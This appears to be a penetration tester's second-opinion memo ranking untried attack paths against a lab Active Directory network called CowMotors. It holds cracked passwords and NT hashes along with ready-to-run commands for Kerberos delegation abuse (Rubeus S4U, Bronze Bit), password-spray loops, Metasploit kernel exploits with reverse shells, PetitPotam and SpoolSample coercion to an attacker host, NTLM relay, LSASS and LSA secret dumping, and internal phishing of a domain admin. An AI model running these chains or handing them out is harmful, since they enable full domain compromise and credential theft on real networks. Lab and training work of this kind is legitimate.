# CowMotors Fresh Review — Untried Attack Paths

Date: 2026-08-22
Reviewer: independent second opinion

## Executive summary of what BH actually says

Confirmed high-value primitives not yet exploited:
- **cowmotors.com IT group (SID -1161) has 11 members**, and both LAPS-READERS live inside it: `June.Byrne` (-1132) and `Diane.Clarke` (-1133). LAPS-READERS reads WEB04+FILE02 LAPS. Sharon.Hudson (-1130) is also in IT.
- **cowmotors.com Domain Admins** (verified by SID): `Rachel.Kennedy` (-1134), `Sam.Carr` (-1135), **`Jay.Ellis` (-1136)**. Jay.Ellis is also Enterprise Admin + Schema Admin. Jay.Ellis is where the operator was already trying S4U impersonation against FILE02 — but Jay is a DA in the ROOT forest, meaning a valid TGS for jay.ellis to any service in cowmotors.com is a total forest compromise. The S4U failure is the ONLY thing standing between the operator and DA.
- **Carole.Davies (-1118)** is in DEV OU, but is the sole member of `SUPPORT-TEST` (-1167), which has `ForceChangePassword` on all 9 HR users (Amy.Johnson, Alison.Dodd, Annette.Gould, Donna.Watson, Eileen.White, Gary.Gibson, Jessica.Clarke, Keith.Thomas, Shaun.Collins). Carole is also in DEV group. Reset any HR user's password without their consent.
- **Two Linux boxes in cowmotors-int** (`DEV02`, `DEV03`) — the operator hasn't touched these. They join the domain (`pc-linux-gnu`) so likely have SSSD/realmd/keytabs.
- Cross-forest hub `cowmotors-lab.com` is **completely unenumerated** and the ONLY direct trust between forests. Both cowmotors.com and cowmotors-int.com trust it bidirectionally (SidFilteringEnabled=true). There is NO direct cowmotors.com ↔ cowmotors-int.com trust in the dumps. Anything crossing forests goes through lab.
- LDAP note: `amit` account exists in neither cowmotors.com nor cowmotors-int.com AD dumps. If it works interactively (as it did for `Invoke-RunasCs -Username amit` on client02) it is either a **local account** on client02 or lives in the unenumerated `cowmotors-lab.com` domain. Local-vs-domain matters — see idea #8.

Now the ideas, ranked.

---

## 1. HTTP-service ticket path to FILE02 (WinRM instead of SMB)

**Rationale.** The operator's S4U for `cifs/file02.cowmotors.com` succeeded (ticket issued) but SMB auth to FILE02 returned `LOGON_FAILURE` for both Administrator and Jay.Ellis. LOGON_FAILURE at auth time (not access denied at SMB) usually means the KDC issued a TGS the target's LSA rejects — often because the requested SPN isn't in the target's account (bad SPN, wrong casing, or DFS/CNAME mismatch) OR the account was already tried against LSA with a stale/cached NT hash. Try a **different service class** on FILE02: HTTP for WinRM.

**Prerequisites.** Already have.
- svc_file:August25 (or NT `08985d3b7b336b046ab92e0b2aaeeaf6`)
- svc_file is trustedtoauth=true with SPNs registered for `cifs`, `host`, `http` per note (see `altservice:cifs,host,http` in operator notes)

**Concrete steps.** Use Rubeus on the WEB04 meterpreter (avoid the buggy impacket 0.13.0 S4U on Mac):

```
Rubeus.exe s4u /user:svc_file /rc4:08985d3b7b336b046ab92e0b2aaeeaf6 /impersonateuser:Administrator /msdsspn:cifs/file02.cowmotors.com /altservice:http/file02.cowmotors.com /ptt /nowrap
```

Then WinRM in the same Rubeus-spawned shell:

```
winrs -r:file02.cowmotors.com "whoami /all & type c:\users\administrator\desktop\local.txt"
```

or from Mac after ticket export:

```
evil-winrm -i file02.cowmotors.com -r cowmotors.com
```

(evil-winrm uses `HTTP/` SPN automatically when Kerberos is set).

Also try `host/file02.cowmotors.com` variant — some tools (Invoke-Command) request the `host` class instead of `http`.

Also try impersonating **jay.ellis** with `/altservice:http` (jay.ellis being a DA, a valid TGS jay.ellis→FILE02 gives DA-context WinRM which lets you pull LSASS and get jay.ellis's TGT).

**Rating: HIGH.** Cheapest thing to try, uses infra already staged. `cifs`-only rejection is a well-known LSA quirk; changing service class usually works.

---

## 2. Read WEB04's OWN LAPS via svc_web foothold + LAPS-READERS chain

**Rationale.** svc_web is SYSTEM-less on WEB04 today, but the machine account WEB04$ has LAPS enabled. To read LAPS on WEB04 or FILE02 you need to be a member of LAPS-READERS (June.Byrne or Diane.Clarke). If you can coerce/relay/kerberoast either one, `Get-LapsADPassword` reads the local Administrator password on WEB04 and FILE02 in one shot — game over for both.

**Prerequisites.**
- Compromise June.Byrne OR Diane.Clarke.

**Concrete steps to compromise them (chained ideas):**

Path A — **Shadow Credentials via AddKeyCredentialLink** (Key Admins + Enterprise Key Admins have `AddKeyCredentialLink` on ALL users in both domains, per dumps). We don't own Key Admins in cowmotors.com. Dead end unless we compromise Key Admins first.

Path B — **Kerberos pre-auth roasting revisited** — the operator kerberoasted all users; but did anyone in IT group have `dontreqpreauth=true`? Confirmed no in the dumps. Skip.

Path C — **Force change password chain**: Carole.Davies (via SUPPORT-TEST) → reset one of the 9 HR users → HR user has no known extra ACLs (verified: HR OU has no non-DA delegation) → dead-end at HR level. Skip unless HR user is logged on somewhere useful; see idea #4.

Path D — **Coerce cowmotors.com DC to authenticate to us with LAPS-READER context** — not possible directly; users don't get coerced, computers do.

Path E — **web04 setup account** — see idea #6. If we get `setup` (local user on WEB04) or the setup script contents, they may contain domain creds for a LAPS-READER (typical Ops pattern — the person who ran the freeze/bootstrap script is often IT).

**Rating: MEDIUM-HIGH.** LAPS reader is the "unlock everything" primitive, but path to reader is not direct.

---

## 3. Carole.Davies → HR users → HR local logons

**Rationale.** Operator already sees the Carole → SUPPORT-TEST → 9 HR ForceChangePassword primitive. The next question is what an HR user *gives us*. In cowmotors.com, HR users are in OU=HR with no delegation. But — cross-domain — the SAME NAMES `John.Forster`, `Amy.Johnson`, etc., exist in cowmotors-int HR OU. If the corp reuses HR credentials across forests (very common lab pattern), a password reset in cowmotors.com may line up with a similar account in cowmotors-int. Try password reuse.

Also HR users are the typical **victims of phishing paths** the lab planted (jobs@cowmotors-int.com went to HR to receive the CV). If any HR user is a local admin on a client machine (unknown; not in LDAP), local-only ACLs matter.

**Concrete steps.**
1. Compromise Carole.Davies (need her creds — see idea #4).
2. `Set-DomainUserPassword -Identity Amy.Johnson -AccountPassword $newpw` (PowerView, from svc_web ccache).
3. Try that pw against Amy.Johnson@cowmotors-int.com and every workstation SMB/WinRM.
4. Enumerate `net localgroup administrators /domain` on each workstation via `nxc smb 172.16.165.0/24 -u Amy.Johnson -p '<newpw>' --loggedon-users`.

**Rating: LOW-MEDIUM.** Only high if the lab designed HR-reset as an intended path.

---

## 4. Carole.Davies compromise via OU=DEV + amit reuse

**Rationale.** We need Carole's creds to unlock idea #3/#5. Carole is in OU=DEV in cowmotors.com. Try `amit:Password123!` first as spray against all DEV OU members in cowmotors.com:
- Pauline.Austin, Craig.Wilkins, Marian.Simpson, Francis.Williams, Alan.Barnett, Dale.Marshall, Scott.Martin, Alexandra.Mann, Leanne.Jones, **Carole.Davies**.

**Concrete steps.** With svc_web ccache exported, LDAP-spray:

```
for u in Pauline.Austin Craig.Wilkins Marian.Simpson Francis.Williams Alan.Barnett Dale.Marshall Scott.Martin Alexandra.Mann Leanne.Jones Carole.Davies; do
  nxc smb dc01.cowmotors.com -u $u -p 'Password123!' -d cowmotors.com --continue-on-success
done
```

Same for cowmotors-int HR OU (John.Forster's neighbors), Sales, Management, DEV.

Bonus: spray with common variants: `Password123`, `Summer2025`, `August25` (svc_file's pw — humans reuse), `Metallica1`.

**Rating: MEDIUM.** Password spray against a specific short list is well within OSEP scope and the lab often re-uses creds.

---

## 5. cowmotors-lab.com — the giant untouched blind spot

**Rationale.** dc03.cowmotors-lab.com is at 172.16.165.102 (ligolo reachable). It's the HUB of the trust triangle. Its own users, DAs, GPOs, service accounts, delegations are unknown. amit likely lives there. Any cross-forest Kerberos delegation that isn't SID-filtered lives there.

**Concrete steps (with svc_web ccache still valid because cross-forest trust exists cowmotors.com ↔ cowmotors-lab.com):**

```
# resolve first
nslookup dc03.cowmotors-lab.com 172.16.165.102

# LDAP anon + authenticated (svc_web)
nxc ldap dc03.cowmotors-lab.com -u svc_web -p Metallica1 -d cowmotors.com --users --groups --admin-count
nxc ldap dc03.cowmotors-lab.com -u svc_web -p Metallica1 -d cowmotors.com --bloodhound --collection All --dns-server 172.16.165.102

# amit spray inside lab
nxc smb dc03.cowmotors-lab.com -u amit -p 'Password123!' -d cowmotors-lab.com
nxc smb dc03.cowmotors-lab.com -u amit -p 'Password123!' -d cowmotors-lab
nxc smb dc03.cowmotors-lab.com -u amit -p 'Password123!' -d COWMOTORS-LAB

# Kerberoast the lab domain — new service accounts likely
GetUserSPNs.py -k -no-pass cowmotors-lab.com/svc_web@dc03.cowmotors-lab.com -dc-host dc03.cowmotors-lab.com -request

# AS-REP roast
GetNPUsers.py -k -no-pass -dc-ip 172.16.165.102 cowmotors-lab.com/ -no-pass -usersfile <users>
```

Cross-forest kerberos with a trust: if svc_web can request TGT via referral in `cowmotors-lab.com`, we get a service ticket authorized by the lab's KDC. SID filtering blocks SID-history but does NOT block a legitimate service ticket issued through the trust — many delegations still traverse.

**Rating: HIGH.** Zero enumeration = 100% new attack surface. The `amit` cred existing outside both known domains screams "lab account". Also potential for **unfiltered service accounts** that delegate back into cowmotors-int.

---

## 6. WEB04 local privesc — the freezeScript / output.txt path

**Rationale.** Operator's notes: `C:\output.txt` = PowerShell transcript from `WEB04\setup` running `C:\freezeScript\win2016.ps1`. svc_web could read `output.txt` but not the script itself. Setup scripts often:
- write encrypted admin passwords they then decrypt with a hard-coded key,
- pull credential from a URL and write to disk temporarily,
- create/set a local Administrator password inline.

If output.txt has any lines starting with `PS C:\freezeScript>` echoing script contents due to `Set-PSDebug -Trace 1`, you might already have the script effectively.

**Concrete steps to try that AREN'T yet done:**

```
# from svc_web meterpreter
type C:\output.txt
type C:\Windows\Temp\output.txt
type C:\users\setup\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\users\setup\Desktop\*.txt
type C:\users\setup\Documents\*.txt
dir /a /s C:\freezeScript
icacls C:\freezeScript\win2016.ps1

# Read setup's PS history (readable if svc_web has read on setup profile in some misconfigs)
Get-ChildItem -Recurse C:\Users\ -Include ConsoleHost_history.txt -ErrorAction SilentlyContinue -Force
```

Also enumerate:
- **Unquoted service paths** on WEB04 via `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\"`
- **Weak service perms**: `accesschk.exe -uwcqv "svc_web" *` (drop accesschk from sysinternals)
- **DLL search-order hijack** on IIS worker: `procmon.exe` filter path=NAME NOT FOUND, or `Get-ChildItem C:\inetpub -Recurse -Include *.config,*.dll,web.config`
- **AlwaysInstallElevated**: `reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` and same in HKCU. If both = 1 → drop MSI as SYSTEM (already have `newlocaladmin.msi` staged).
- **Cached credentials in the registry** (COM+ AutoLogon, WinLogon):

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SYSTEM\CurrentControlSet\Services\OrangeSurvey" /s
```

- **Razor/IIS app pool identity secrets**: `C:\inetpub\wwwroot\<app>\web.config` frequently has connection strings — the Razor app uses OrangeSurvey which likely has a DB backend on DB01 (172.16.165.223).

**Concrete DB01 lead**: web04 → DB01 connection string. If you find one, `nxc mssql db01.cowmotors-int.com` with those creds; MSSQL xp_cmdshell → SYSTEM on DB01. From there, dump SAM and pivot within cowmotors-int.

**Rating: HIGH (privesc via config file); MEDIUM (DB01 pivot).**

---

## 7. WEB04 privesc: WEB04 machine-account TGT via SeImpersonate-less methods

**Rationale.** Local privesc suggester found bypassuac_* and CVE-2020-1337/2022-21882/2023-28252/2024-30085/2024-35250 all vulnerable. Operator says "nothing worked" but only tried potato attacks. The kernel CVEs weren't tried per notes.

**Concrete tries:**

```
# In msf session
use exploit/windows/local/cve_2023_28252_clfs_driver
set session <N>
set target 2
set payload windows/x64/meterpreter_reverse_https
set lhost tun0
set lport 443
run
```

Also `cve_2022_21882_win32k` (works on Server 2019). Also `cve_2024_35250_ks_driver`. Also `cve_2024_30085_cloud_files`.

If ANY works → SYSTEM on WEB04 → dump WEB04$ machine account NT hash from LSA → machine account can request its own TGT → then S4U from WEB04$ (WEB04$ is trustedtoauth=false per BH, so plain S4U2Self only unless we ALSO write msDS-AllowedToActOnBehalfOfOtherIdentity).

But once SYSTEM on WEB04, immediately try **`Get-LapsADPassword -Identity WEB04$ -AsPlainText`** — this is different: if the LAPS GPO scope covers WEB04 and the machine has LAPS write, LAPS-READERS can read. As SYSTEM on WEB04, you ARE WEB04$. Machine accounts can read their OWN LAPS in some configs. Test: `Rubeus.exe asktgt /user:WEB04$ /rc4:<from lsass>` then LDAP-query the ms-Mcs-AdmPwd attribute — the machine account itself has read-property on its own LAPS attribute in most implementations.

**Rating: HIGH for kernel CVE (never tried).** Getting SYSTEM on WEB04 unblocks a lot: LSASS on WEB04, jay.ellis TGT if he ever logs on, freezeScript readable, DPAPI blobs.

---

## 8. amit local account hypothesis — DPAPI + LSA on client02

**Rationale.** `amit:Password123!` worked as `Invoke-RunasCs -Username amit` on client02, but amit isn't in AD. This means amit is a **local account on client02**. If so, client02 SAM contains amit's NT hash and probably other locals (Administrator). Operator has SYSTEM (or should — check with `getsystem` in msf) on client02 already via John.Forster + amit spawn.

**Concrete steps:**
```
# In msf session on client02:
getuid
# if not SYSTEM, use existing MSF privesc modules (client02 also has ks_driver, clfs, etc)
run post/windows/gather/hashdump           # SAM
run post/windows/gather/smart_hashdump     # if network dumps
load kiwi
lsa_dump_sam
lsa_dump_secrets
creds_all
```

`lsa_dump_secrets` will spill:
- Any DefaultPassword AutoLogon
- **Service account passwords in cleartext** stored as LSA secrets (this is where svc_* accounts often live if a service runs as them)
- **DPAPI master keys** for cached user profiles → decrypt browser creds, saved RDP creds, Credential Manager entries

CLIENT02 has 6 logged-on users per the initial output ("Logged On Users : 6"). LSASS has 6 credential materials to enumerate.

Also — if amit is a LOCAL admin on client02, is amit ALSO local admin on OTHER workstations? Password reuse across local Administrator/created accounts is standard lab pattern. `nxc smb 172.16.165.50-70 -u amit -p 'Password123!' --local-auth` sprays local-auth (`--local-auth`) which is exactly what worked on client02.

**Rating: HIGH.** Trivial to try, huge payoff if amit is a shared local admin.

---

## 9. AS-REP + Kerberoast against cowmotors-lab.com

**Rationale.** Operator kerberoasted both known domains but not the third. Given cowmotors-lab.com is the trust hub, its SPN accounts likely include cross-forest-trust service accounts.

**Concrete:**
```
GetUserSPNs.py -k -no-pass cowmotors-lab.com/svc_web@dc03.cowmotors-lab.com -dc-host dc03.cowmotors-lab.com -request -outputfile lab_spns.txt
GetNPUsers.py -k -no-pass -dc-ip 172.16.165.102 -request cowmotors-lab.com/ -usersfile lab_users.txt -format hashcat -outputfile lab_asrep.txt
```

**Rating: MEDIUM.** Depends on lab having crackable service accounts — plausible given cowmotors.com had `svc_web:Metallica1` and `svc_file:August25`, both weak.

---

## 10. PetitPotam / DFSCoerce / PrinterBug on any DC or FILE02

**Rationale.** Coercion primitives are unpatched in labs. Force any target to authenticate to your ligolo endpoint. Combined with a machine-account TGT capture (relay to LDAP for RBCD, or plain NTLM capture in `responder` for cracking) can escalate.

**Concrete against DC02 (cowmotors-int) from john.forster meterpreter on client02 (already inside 172.16.165.0/24):**

```
# On Mac (ligolo pivot side)
sudo responder -I utun10 -A -v

# From client02 (as john.forster — coerce needs authenticated) 
# Use PetitPotam.py against DC02 to trigger EFSRPC coercion
python3 PetitPotam.py -u John.Forster -p '<forster_pw>' 172.16.165.<attacker> 172.16.165.101

# or DFSCoerce
python3 dfscoerce.py -u John.Forster -p '<pw>' 172.16.165.<attacker> 172.16.165.101

# PrinterBug via SpoolSample.exe on-box
SpoolSample.exe dc02.cowmotors-int.com attacker.local
```

DC02$ tries to authenticate to attacker.local → capture NTLMv2 challenge/response for DC02$ → crack if weak (unlikely), OR **relay to LDAP** on DC01 with `ntlmrelayx.py -t ldap://dc01.cowmotors.com --escalate-user John.Forster` — but that's DC → different DC, cross-forest, and SidFiltering blocks any SID trick.

Better target: relay **DC02$ or WEB03$ or CLIENT02$ NTLM to LDAP on the *same domain's* DC** (dc02) with `-t ldap://dc02.cowmotors-int.com --delegate-access` to write RBCD on any computer we can reach. `--delegate-access` requires the relayed account to have local admin on the target computer object; DC computer accounts generally do NOT, but this is worth 5 minutes.

Also: john.forster is a domain user; if we get **CLIENT02$** to authenticate to us (via a coerce, or install a service that auths outbound), we can request TGT for CLIENT02$ from its NT hash (we have it: `b40db1100a8d618a658705a25c380f66`), which is a real machine account TGT — CLIENT02$ is local admin of itself, and can be relayed for RBCD writes.

**Rating: MEDIUM.** Coercion is standard OSEP tool; requires responder listener behind ligolo (which needs `--tun` or a proper reverse tunnel because responder listens on the client-side interface).

---

## 11. RBCD against WEB01 using CLIENT02$ machine account

**Rationale.** We already have `CLIENT02$` NT hash (`b40db1100a8d618a658705a25c380f66`). CLIENT02$ is in cowmotors-int.com. Terence.Ford (SID -1132) has `AddAllowedToAct` on WEB01. If we can compromise Terence, we can add CLIENT02$ (or any machine account we own) to WEB01's msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U2Self+S4U2Proxy as CLIENT02$ to impersonate Administrator@cowmotors-int.com to WEB01.

But we don't have Terence. So flip the primitive around:

**Alternative — CLIENT02$ tgtdeleg to gain a computer-account TGT, then use that TGT to LDAP-query cowmotors-int.com and enumerate deeper than we've done.** BloodHound was run with `john.forster` and svc_web tickets. Running BloodHound with `CLIENT02$` ticket may reveal LDAP objects visible to computer accounts (some sensitive attrs like laps-enabled or SPN details are computer-readable only).

```
# from client02 meterpreter
Rubeus.exe asktgt /user:CLIENT02$ /rc4:b40db1100a8d618a658705a25c380f66 /nowrap
# import, then re-run BH
nxc ldap dc02.cowmotors-int.com -k --use-kcache --bloodhound --collection All,LoggedOn --dns-server 172.16.165.101
```

Note the `LoggedOn` collector — this queries sessions RPC and requires SMB reachability + admin on the target. But if it works on any workstation, we see who's logged on where — for finding jay.ellis or a LAPS-READER's active session for token theft.

**Rating: MEDIUM.** Not directly game-over but broadens enumeration.

---

## 12. Bronze Bit (CVE-2020-17049) against svc_file → any target

**Rationale.** Operator has svc_file's password. svc_file has constrained delegation with protocol transition. If dc01.cowmotors.com is unpatched for CVE-2020-17049, we can flip the "forwardable" flag in the TGS S4U2Proxy request and impersonate users we shouldn't be able to (including "sensitive/cannot be delegated" users).

**Concrete:**
```
# impacket (need >= 0.10.0 with -force-forwardable)
python3 getST.py -spn cifs/file02.cowmotors.com -impersonate Administrator -dc-ip 172.16.165.100 cowmotors.com/svc_file:August25 -force-forwardable
```

Also try with impersonation of an account that IS in "Protected Users" or has `sensitive=true` (from BH: `sensitive=false` for all our known targets — so not the pure bronze bit case).

More importantly, if the S4U2Proxy against FILE02 is failing on the forwardable flag (some hardened LSAs verify it), `-force-forwardable` from Rubeus (`/force-forwardable` in newer Rubeus) may fix it directly:

```
Rubeus.exe s4u /user:svc_file /rc4:08985d3b7b336b046ab92e0b2aaeeaf6 /impersonateuser:Administrator /msdsspn:cifs/file02.cowmotors.com /altservice:cifs,host,http /force-forwardable /ptt
```

Rubeus `s4u /force-forwardable` is the on-box equivalent of impacket's bronze-bit — DC01 must accept unpatched-style requests. If DC01 is patched, this returns `KRB_ERR_BADOPTION` (23) not `LOGON_FAILURE`. The operator's `LOGON_FAILURE` from FILE02 (not from KDC) makes me think the KDC issued the ticket but LSA on FILE02 rejected it — bronze-bit *fixes exactly that path* by flipping the FORWARDABLE flag so LSA accepts. **Very promising.**

**Rating: HIGH.** Directly addresses the operator's stall.

---

## 13. Exploit web03.cowmotors-int.com SMTP spool

**Rationale.** web03 is the SMTP that received the CV. The operator hasn't inspected its **attachments spool directory** post-foothold. If svc_file (or CLIENT02$) has any read on web03's `\\web03\attachments$` or `C:\inetpub\mailroot\Drop`, we can:

- See who else has been sending mail (may leak internal email addresses / usernames)
- Look for auto-processing: many labs park a script that parses inbound mail and drops parsed content into a share. **If we can craft an attachment that gets processed by a vulnerable parser (ClamAV CVE, PDF handler, Office DDE if opened by a user)**, we get code execution as whoever runs the parser.

**Concrete steps.**
```
# From client02 (john.forster ticket)
nxc smb web03.cowmotors-int.com -k --use-kcache --shares
nxc smb web03.cowmotors-int.com -k --use-kcache --spider C$ --regex ".*\.ps1|.*\.bat|.*\.vbs|.*schedule.*"
smbclient.py -k -no-pass cowmotors-int.com/John.Forster@web03.cowmotors-int.com

# List scheduled tasks on web03
schtasks /query /s web03 /v /fo csv > tasks.csv
```

Also — SMTP relay: does web03 allow relay from internal? `swaks --server 172.16.165.201 --to admin@cowmotors.com --from noreply@cowmotors-int.com --auth-user amit --auth-password 'Password123!'`. Internal phishing against jay.ellis with a lure that lands him on our ligolo listener (client-side attack).

**Rating: MEDIUM.** OSEP-style: client-side attacks are in-scope. Phishing jay.ellis (a DA) from inside is a valid finishing move.

---

## 14. Linux boxes DEV01, DEV02, DEV03

**Rationale.**
- DEV01 (`DEV01`, no FQDN, `pc-linux-gnu`, cowmotors.com) — public? domain-joined. IP unknown but the task says "public 192.168.165.80 DEV.dev" — hostname matches. DEV.dev is likely DEV01.cowmotors.com joined via SSSD or similar (MSSQL port open — Linux MSSQL is unusual but Docker-hosted mssql-server is common).
- DEV02, DEV03 (cowmotors-int) — internal (172.16.165.222 or similar), never enumerated.

**Concrete:**
```
# DEV.dev = 192.168.165.80 — MSSQL open, try known creds
nxc mssql 192.168.165.80 -u sa -p 'Password123!'
nxc mssql 192.168.165.80 -u amit -p 'Password123!'
nxc mssql 192.168.165.80 -u svc_web -p 'Metallica1'

# SSH try
ssh amit@192.168.165.80    # amit:Password123!
ssh svc_file@192.168.165.80  # August25

# WinRM open on 5985 despite being Linux? — port scan says yes on the public 192.168.165.80
nxc winrm 192.168.165.80 -u amit -p 'Password123!'

# For DEV02/DEV03 via ligolo:
nmap -sV -p22,80,111,139,443,445,1433,2049,3306,5432,5985,8080 172.16.165.222 -Pn
# also scan 10.10.70.0/24 if reachable
```

**Rating: HIGH for DEV.dev (public, MSSQL + WinRM open, and marked "Dev - to prepare payloads" in the mission brief — this may be an INTENDED foothold).** Especially since the brief literally says "Dev machine has been included to allow for the preparation of any payloads".

---

## 15. Second internal subnet 10.10.70.0/24

**Rationale.** Operator notes mention `10.10.70.10` as a 2nd internal subnet. Nothing enumerated. Any host on the 172.16.165.0/24 side that is dual-homed can pivot us into it.

**Concrete:**
```
# From meterpreter on client02
route
arp -a
netstat -rn

# Check if any machine on cowmotors.com/int has an interface into 10.10.70.0/24
for h in dc01 dc02 file02 web01 web02 web03 web04 client01 client03 client05; do
  echo "==$h=="
  nxc smb $h.cowmotors.com -k --use-kcache 2>/dev/null
done

# Look at DHCP scopes on the DC — DHCP is often on DC01/DC02
```

If DEV01/DEV02/DEV03 span both subnets (Linux devs often on the internal-lab network), pivot through them.

**Rating: LOW-MEDIUM.** Depends on lab design; may just be a stub.

---

## 16. Use svc_web LDAP write to enumerate & test AD write primitives

**Rationale.** Operator's SSTI gave `svc_web` context. svc_web is a regular Domain User in cowmotors.com. Domain Users can:
- Read most attributes (already done via BH).
- Register up to `ms-DS-MachineAccountQuota` computer accounts (default 10) — REGISTER OUR OWN MACHINE ACCOUNT.

**This is huge for RBCD** if we ever get GenericWrite on a target computer. The chain:
1. Register `evilmachine$` via `impacket-addcomputer -computer-name 'evilmachine$' -computer-pass 'Pass123!' -dc-host dc01.cowmotors.com cowmotors.com/svc_web:Metallica1`
2. Use this machine account as the "impersonator" in an RBCD attack — needed for the terence.ford → WEB01 chain (idea #11), the LAPS-READER chain (#2), or any Shadow-Cred chain (#17).

**Prerequisite:** verify MachineAccountQuota != 0:
```
nxc ldap dc01.cowmotors.com -u svc_web -p Metallica1 -d cowmotors.com -M maq
```

**Rating: MEDIUM (a building block, not a finisher).**

---

## 17. Shadow Credentials (Key Admins path) via Domain Controller PKI

**Rationale.** BH shows `Key Admins` (-526) and `Enterprise Key Admins` (-527) have `AddKeyCredentialLink` on every user & computer in BOTH cowmotors.com and cowmotors-int.com. Both groups are **empty** in the dumps. But if PKINIT (smartcard logon) is enabled and the domain has an integrated CA, you don't need Key Admins — anyone who has GenericWrite/GenericAll on a target can add a msDS-KeyCredentialLink and then Kerberos-cert-login as that target.

- Terence.Ford has GenericWrite on WEB01 → he could Shadow-Cred WEB01 → login as WEB01$ → SYSTEM on WEB01.
- Any DA has GenericAll on everyone → moot for us.

**But** — does cowmotors.com/-int have an AD CS server? Neither dump shows one (would show as a computer with `Cert Publishers` populated — both are empty). Without CA, Shadow Creds fails. But NEW-in-Server-2016+ hosts with PKINIT enabled and `Certificate Enrollment Web Service` may work with a self-signed cert; also worth trying since it "just works" if PKINIT accepts.

**Concrete (if we ever get GenericWrite on any target):**
```
Whisker.exe add /target:WEB01$ /domain:cowmotors-int.com /dc:dc02.cowmotors-int.com
Rubeus.exe asktgt /user:WEB01$ /certificate:<b64> /password:<pw> /nowrap
Rubeus.exe s4u /user:WEB01$ /... /ptt
```

Also: **certipy find** enumeration:
```
certipy find -u svc_web@cowmotors.com -p Metallica1 -dc-ip 172.16.165.100 -stdout -vulnerable
```

Runs from Mac (impacket-based). Even without an obvious CA on BH, PKI often exists but wasn't tagged.

**Rating: MEDIUM.** Long chain, but very high payoff if PKI exists.

---

## 18. Verify DC01/DC02 are unconstrained delegation and abuse via coercion

**Rationale.** BH shows `unconstraineddelegation=true` for both DC01 and DC02. This is expected for DCs. Normally not exploitable because DCs are unreachable for coerce-relay. BUT — if we can coerce a *different* host with unconstrained delegation (none exist in the dumps besides DCs), we could capture TGTs.

WEB04, FILE02, WEB01, WEB02, DEV0x are all `unconstraineddelegation=false`. No fun there.

But — **if any account in cowmotors-lab.com has unconstrained delegation**, and we can trigger a DA or high-value user from cowmotors.com to authenticate to that host (e.g., via SMTP-triggered UNC callback on web03), we capture their TGT. Enumerate this after idea #5.

**Rating: LOW-MEDIUM.** Speculative pending lab enumeration.

---

## 19. GPO abuse: LAPS GPO in cowmotors.com

**Rationale.** BH shows a GPO named `LAPS@COWMOTORS.COM` (gpcpath `\\COWMOTORS.COM\SYSVOL\COWMOTORS.COM\POLICIES\{D448F386-A62E-41E5-8FDF-D4F57DC398C9}`). Its ACEs are empty in the dump (only defaults) — so no obvious hijack. But **read the GPO contents** — svc_web can `dir \\cowmotors.com\SYSVOL\...` and may find:
- The LAPS GPO's ADM template referencing which OUs get LAPS
- Any credentials leftover in `groups.xml` or `preferences.xml` (cpassword attack — old MS14-025)
- Startup/logon scripts

**Concrete:**
```
# from web04 svc_web meterpreter or Mac via ccache
smbclient.py -k -no-pass cowmotors.com/svc_web@cowmotors.com
# use SYSVOL
# ls POLICIES\{D448F386-A62E-41E5-8FDF-D4F57DC398C9}
# recurse and cat every .xml

# Or via nxc
nxc smb dc01.cowmotors.com -k --use-kcache --spider SYSVOL --regex ".*(cpassword|password|pwd|secret).*"
```

Same for cowmotors-int.com SYSVOL:
```
nxc smb dc02.cowmotors-int.com -k --use-kcache --spider SYSVOL --regex ".*(cpassword|password|pwd|secret).*"
```

**Rating: MEDIUM.** Cheap to try, GPO cpassword hits are still common in labs. If a Group Policy Preferences file has `cpassword=`, that's an old-style MS14-025 decrypt straight to domain creds.

---

## 20. `Sharon.Hudson` cross-domain — admin@Client01, but Client01 is in cowmotors.com

**Rationale.** BH description on Sharon.Hudson literally says "Admin @ Client01". Client01 is `CLIENT01.COWMOTORS.COM` (172.16.165.60). Getting Sharon's creds → local admin on CLIENT01 → LSASS dump → whatever cached creds are there (jay.ellis?, LAPS-READER?, another DA?).

**Getting Sharon's creds** — Sharon is in IT group but has no direct AS-REP/roast/write ACL exposure. **Best path: password spray with amit + Password123!, or spray with the two known cracked passwords (August25, Metallica1)** against the IT OU users specifically:

```
for u in Sharon.Hudson June.Byrne Diane.Clarke Frances.Robertson Caroline.Baxter Adrian.Coleman Patrick.Gibson Jay.Ellis Sam.Carr Rachel.Kennedy; do
  for pw in 'Password123!' 'August25' 'Metallica1' 'Summer2025' 'Winter2025' 'Password1' 'P@ssw0rd'; do
    nxc smb dc01.cowmotors.com -u $u -p "$pw" -d cowmotors.com --continue-on-success 2>/dev/null | grep -i "\[+\]"
  done
done
```

Watch out for lockout — cowmotors is a lab so lockout is usually generous (10+ attempts).

Alternate path: **Kerberos U2U (User-to-User) roasting** — if any user has `msDS-KeyCredentialLink` set (self-registered), you can enumerate via LDAP. Also `Get-ADReplAccount -SamAccountName Sharon.Hudson -Server dc01 -Credential (Get-Credential)` if we ever get DA on cowmotors-lab that trusts cowmotors.

**Rating: MEDIUM.** Contingent on spray success.

---

## 21. Priority ordering for tomorrow's session

Ordered by (impact × ease):

1. **#12 Bronze Bit s4u with `/force-forwardable`** (5 min, likely unblocks FILE02).
2. **#1 HTTP altservice for FILE02 WinRM** (5 min, alternative unblock).
3. **#8 amit local spray + LSA/SAM dump on client02** (10 min, huge if amit is local).
4. **#14 DEV.dev enumeration** (10 min, brief calls it out as intended).
5. **#5 cowmotors-lab.com enumeration** (20 min, unlocks entire third of the topology).
6. **#7 Kernel CVE on web04** (10 min per, chance-of-SYSTEM).
7. **#4 Password spray amit against DEV OU + IT OU for Carole and Sharon** (10 min).
8. **#6 web04 config file / freezeScript deeper look** (15 min).
9. **#19 SYSVOL cpassword spider** (5 min).
10. **#20 Sharon.Hudson spray → Client01 pivot** (10 min).
11. **#10 PetitPotam coercion for DC02$** (20 min setup).
12. **#13 web03 SMTP spool + internal phishing to jay.ellis** (30 min).

Everything else is a supporting building block or contingent on the above.

---

## 22. Things that WILL NOT work — do not waste time

- **SID history injection cross-forest** — `SidFilteringEnabled=true` on both trusts.
